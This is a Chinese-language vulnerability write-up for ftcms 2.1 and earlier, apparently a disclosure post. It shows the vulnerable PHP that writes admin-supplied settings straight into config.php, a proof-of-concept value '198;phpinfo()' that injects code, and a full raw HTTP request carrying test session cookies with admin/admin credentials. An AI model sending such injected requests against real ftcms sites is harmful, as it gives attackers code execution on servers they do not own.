# ftcms存在代码执行漏洞

供应商：http://www.ftcms.cn/

软件下载链接：http://www.ftcms.cn/skin/ftcms_v2.1.zip

影响版本：ftcms<=2.1

## 1.漏洞分析

此代码执行漏洞的原理是使用后台模板函数修改"config.php"文件造成的。接下来，根据代码分析漏洞是如何引起的。

首先，找到模板并修改文件代码。文件位置为admin/controllers/setting.php

```text
http://host/admin/index.php/setting/setting_edit
```

数据库配置写入的相应方法是file_edit

```php
   //设置配置变量(高级设置)
   public function setting_edit(){
          $data=$this->input->post();
		  $res=$this->m->setting_edit($data['info']);
		    if($res){
				 $this->message('修改成功！',site_url($this->router->class.'/form'));
			}else{
			   $this->message('修改失败！根目录config.php文件权限不够',site_url($this->router->class.'/form'));
			}
   
   }
```

![image](https://user-images.githubusercontent.com/54017627/168752032-8ecda0a2-31c3-4fc0-a965-ea0e5d93b480.png)

第一步，它使用输入类的$this->input->post（）函数，从用户获取所有post数据

![image](https://user-images.githubusercontent.com/54017627/168752083-dce80c61-6dd6-47b6-b705-653c19156dd4.png)

然后它在 admin/models/settingm 中使用 setting_edit 函数.php修改配置文件，代码示例：

```php
//更新根目录config.php配置文件
 public function setting_edit($data){
        $res='';
	//循环分页配置
		$res.="//分页配置\r\n";
		foreach($data['wl_page'] as $key=>$v){
		  $res=$res.'$GLOBALS["wl_page"]["'.$key.'"]='.$v.";\r\n";
		  
		}
		
		//循环数据库配置
		$res.="//数据库配置\r\n";
		foreach($data['wl_db'] as $key=>$v){
		   $res=$res.'$GLOBALS["wl_db"]["'.$key.'"]="'.$v.'"'.";\r\n";
		  
		}
		
		//循环水印配置
		$res.="//水印信息配置\r\n";
		foreach($data['wl_water'] as $key=>$v){
		   $res=$res.'$GLOBALS["wl_water"]["'.$key.'"]='.$v.";\r\n";
		}
		
	   //编辑器远程图片自动下载
		$res.="//编辑器远程图片自动下载\r\n";
		foreach($data['wl_down'] as $key=>$v){
		   $res=$res.'$GLOBALS["wl_down"]["'.$key.'"]='.$v.";\r\n";
		}
	 //sdk
		$res.="//授权码，此授权码在软件初始化的时候自动生成，且唯一。请勿将此授权码告知其他客户。\r\n";
		foreach($data['wl_sdk'] as $key=>$v){
		   $res=$res.'$GLOBALS["wl_sdk"]["'.$key.'"]="'.$v.'"'.";\r\n";
		}
			
		
		 //循环调试信息配置
		$res.="//调试信息配置\r\n";
		foreach($data['wl_ts'] as $key=>$v){
		  $res=$res.'$GLOBALS["wl_ts"]["'.$key.'"]='.$v.";\r\n";
		}
		
		$res="<?php \r\n".$res."\r\n?>";
		//写入信息
		$this->load->helper('file');
		if ( ! write_file('../config.php', $res)){
             return false;
          }else{
             return true;
        }
	
 }
```

![image](https://user-images.githubusercontent.com/54017627/168752167-9257573d-a87c-44b0-b577-5d0b20d73b15.png)

您可以看到，此函数将在遍历后将传递的值分配给$res变量

![image](https://user-images.githubusercontent.com/54017627/168752217-1bdf2a5a-0f95-43f4-b458-5c0a915329d2.png)

然后在变量前后添加PHP文件的后缀

![image](https://user-images.githubusercontent.com/54017627/168752262-0b088b5c-bea0-4780-bd98-0f7d7ebc0fd0.png)

然后在 CI 框架的帮助程序帮助类中调用文件类

![image](https://user-images.githubusercontent.com/54017627/168752379-3e91426a-5a6a-4a3e-a5ca-d3d19baca6bc.png)

最后调用write_ file 函数将拼接$res变量的内容写入本地配置 PHP 文件，并根据网站目录，配置 PHP 位于网站的根目录中。网站结构如下图所示：

![image](https://user-images.githubusercontent.com/54017627/168752429-34b68f1f-6fea-4ae4-beba-2c62066c11c1.png)

让我们打开"config.php"文件来检查文件结构，这有助于我们构建 POC 并确保网站的正常运行

![image](https://user-images.githubusercontent.com/54017627/168752508-d3a7be38-501d-4b97-94b7-4b4216ee6e2f.png)

因为配置PHP中的格式比较标准，所以我们只需要使用它;将它们分开，然后拼接我们需要执行的PHP代码。这里我们选择水印信息配置，最终的POC如下

```php
198;phpinfo()
```

## 2.漏洞复现

完整的数据包如下所示

```text
POST /admin/index.php/setting/setting_edit HTTP/1.1
Host: ft.rapoo.top
Content-Length: 1879
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://ft.rapoo.top
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi0GP8ideg4MNEzxf
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://ft.rapoo.top/admin/index.php/setting/
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=1803c2602eb210-05a24410a265d9-1734337f-1fa400-1803c2602ec659; PHPSESSID=oubgsm5s2klu8pdsi9vo392813; Hm_lvt_ff7ff59731fd28defa244db58332ee7f=1651140813; username=admin; pwd=admin; XDEBUG_SESSION=PHPSTORM; Hm_lpvt_ff7ff59731fd28defa244db58332ee7f=1651199882; ci_session=a%3A6%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22591a2a0dc1ce50b0b1e549249759a497%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A116%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F100.0.4896.127+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1651200575%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22user%22%3Ba%3A11%3A%7Bs%3A2%3A%22id%22%3Bs%3A1%3A%221%22%3Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3Bs%3A7%3A%22userpwd%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3Bs%3A5%3A%22email%22%3Bs%3A15%3A%22admin%40localhost%22%3Bs%3A7%3A%22regtime%22%3Bs%3A1%3A%220%22%3Bs%3A5%3A%22regip%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A9%3A%22logintime%22%3Bs%3A10%3A%221651198696%22%3Bs%3A7%3A%22loginip%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A4%3A%22hits%22%3Bs%3A1%3A%226%22%3Bs%3A9%3A%22listorder%22%3Bs%3A1%3A%220%22%3Bs%3A4%3A%22type%22%3Bs%3A2%3A%2215%22%3B%7D%7Dc5ec924b3daf9f5c58ea92033589871df73478ba
Connection: close

------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_page][news]"

10
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_db][hostname]"

localhost
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_db][username]"

ftcms123
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_db][password]"

ftcms123
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_db][database]"

ftcms
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_water][action]"

false
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_water][min_image_w]"

300
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_water][min_image_h]"

198;phpinfo()
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_down][action]"

true
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_down][max_image_w]"

600
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_ts][db_debug]"

false
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_ts][db_debug_file]"

false
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_ts][error]"

false
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_ts][cache]"

false
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="info[wl_sdk][code]"

5edb65b9add1ca82002d7e418d19a0ec
------WebKitFormBoundaryi0GP8ideg4MNEzxf
Content-Disposition: form-data; name="dosubmit"

æäº¤
------WebKitFormBoundaryi0GP8ideg4MNEzxf--
```

### 2.1打开数据库配置菜单

打开后台-常用-相关配置-网站设置-高级设置

![image](https://user-images.githubusercontent.com/54017627/168753459-0a144c0e-5fbe-4fa9-922f-68829d022d2c.png)

### 2.2 修改水印设置

![image](https://user-images.githubusercontent.com/54017627/168753505-0b5637de-5a06-49c4-9a4b-3c4ba345a0c5.png)

### 2.3 提交

![image](https://user-images.githubusercontent.com/54017627/168753550-b26e6274-c00e-4e03-8318-82267055d36d.png)

### 2.4请求配置文件

完整路径:

```php
http://host/config.php
```

![image](https://user-images.githubusercontent.com/54017627/168753648-cf842c34-9894-45b2-b70a-c36e352aa8d5.png)
